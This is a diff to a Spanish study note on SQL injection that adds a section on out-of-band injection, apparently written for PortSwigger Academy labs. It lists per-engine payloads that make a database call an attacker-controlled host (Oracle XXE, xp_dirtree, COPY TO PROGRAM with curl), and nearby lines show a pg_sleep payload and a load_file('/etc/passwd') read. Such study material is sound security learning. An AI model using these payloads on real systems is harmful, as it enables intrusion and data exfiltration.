@@ -86,7 +86,42 @@ Cookie: TrackingId=x'%3BSELECT+pg_sleep(10)--
 
 Burp Repeater no encodea automáticamente — escribirlo ya como `%3B`. Mismo cuidado con `,` en algunos parsers de cookies. En parámetros GET/POST normales el `;` no es delimitador y va literal.
 
-### 4. Lectura de Archivos Locales (load_file)
+### 4. Inyección Fuera de Banda (Out-of-Band / OAST)
+Cuando ni los errores, ni el body, ni el tiempo de respuesta reflejan el resultado de la query (típico de queries async fire-and-forget), el último canal viable es **fuera de banda**: forzar a la DB a iniciar una conexión saliente (DNS lookup, HTTP request, SMB) hacia un host que controlamos. La interacción recibida en nuestro listener confirma la inyección, y según el motor permite además exfiltrar datos en el subdominio o el path.
+
+**Primitivas OOB por motor**:
+
+| Motor | Primitivo | Notas |
+|---|---|---|
+| **Oracle** | `EXTRACTVALUE(xmltype('<!DOCTYPE x [ <!ENTITY % p SYSTEM "http://COLLAB/"> %p; ]>'),'/l')` | XXE durante el parseo del `xmltype()`. No requiere permisos especiales; la primitiva más limpia |
+| **Oracle** | `UTL_HTTP.REQUEST('http://COLLAB/')` o `UTL_INADDR.GET_HOST_ADDRESS('COLLAB')` o `DBMS_LDAP.INIT('COLLAB',389)` | Alternativas si XXE está bloqueado. Requieren permisos sobre estos packages |
+| **MS SQL** | `EXEC master..xp_dirtree '\\COLLAB\share'` | UNC path → SMB/NetBIOS lookup. También `xp_fileexist`, `BULK INSERT FROM` |
+| **MySQL** (Windows) | `LOAD_FILE('\\\\COLLAB\\share')` o `SELECT ... INTO OUTFILE '\\\\COLLAB\\…'` | Sólo en Windows (Linux no resuelve UNC). Requiere `FILE` privilege |
+| **PostgreSQL** | `COPY (SELECT '') TO PROGRAM 'curl http://COLLAB/'` | Requiere superuser. Más práctico vía extensiones (`dblink`, `postgres_fdw`) |
+
+**Ejemplo Oracle XXE completo** (el más usado en pentests reales y labs PortSwigger):
+
+```sql
+' UNION SELECT EXTRACTVALUE(xmltype(
+  '<?xml version="1.0" encoding="UTF-8"?>
+   <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLAB.oastify.com/"> %remote;]>'
+), '/l') FROM dual--
+```
+
+La entidad `%remote` se resuelve durante el `xmltype()` — antes incluso de llegar a `EXTRACTVALUE`. El `EXTRACTVALUE` sólo está para que el `SELECT` sea sintácticamente válido.
+
+**Receptor OOB (OAST)**:
+
+| Herramienta | Dominio | Coste | Cuándo usarla |
+|---|---|---|---|
+| **Burp Collaborator** | `*.oastify.com` | Burp Pro | Pentesting profesional, labs PortSwigger Academy |
+| **interactsh** | `*.oast.me`, `*.oast.fun`, etc. | Gratuito | CTF, bug bounty, entornos sin firewall restrictivo |
+| **DNSLog** | `dnslog.cn` | Gratuito | Tests rápidos puntuales |
+| **Servidor propio** | dominio propio | Variable | Cuando hay que evadir allowlists o auditar receptor |
+
+**⚠️ Allowlists de OAST**: algunos entornos de prácticas/red teams sólo dejan salir hacia dominios específicos. PortSwigger Academy bloquea todo OOB hacia dominios distintos de `*.oastify.com` para evitar abuso. Verificar restricciones del target antes de invertir tiempo en debug — si el firewall corta la salida, ningún payload funcionará independientemente de su corrección sintáctica.
+
+### 5. Lectura de Archivos Locales (load_file)
 Si el usuario de la DB tiene permisos de lectura y la variable `secure_file_priv` es nula:
 - **MySQL**: `' UNION SELECT 1, load_file('/etc/passwd'), 3, 4--`
 
@@ -102,3 +137,4 @@ Si el usuario de la DB tiene permisos de lectura y la variable `secure_file_priv
 - PortSwigger Web Security Academy. (s.f.). *Blind SQL injection*. https://portswigger.net/web-security/sql-injection/blind
 - Writeup propio: [`learning/portswigger/visible-error-based-sql-injection/writeup.md`](../../../learning/portswigger/visible-error-based-sql-injection/writeup.md) — ejemplo end-to-end del primitivo `CAST` en PostgreSQL leyendo `users.password` desde una cookie de tracking, incluyendo workaround con `||` ante límite de longitud.
 - Writeup propio: [`learning/portswigger/blind-sqli-time-delays/writeup.md`](../../../learning/portswigger/blind-sqli-time-delays/writeup.md) — ejemplo end-to-end de time-based con `pg_sleep` vía stacked queries en cookie, incluyendo el detalle de URL-encodear el `;` como `%3B`.
+- Writeup propio: [`learning/portswigger/blind-sqli-out-of-band/writeup.md`](../../../learning/portswigger/blind-sqli-out-of-band/writeup.md) — ejemplo de OOB en Oracle vía XXE en `xmltype()` + diagnóstico del bloqueo por allowlist de OAST en PortSwigger Academy (sólo `*.oastify.com`).
